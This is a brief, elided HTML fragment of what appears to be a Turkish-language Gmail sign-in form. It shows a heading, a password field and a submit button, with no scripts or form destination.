...
<h1>
  ...
  Gmail’e devam etmek için giriş yapın
  </h2>
</div>
...
<input id="Passwd" name="Passwd" type="password" placeholder="Şifrenizi girin" class="">
  </div></div>
  </div>
<input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="İleri">
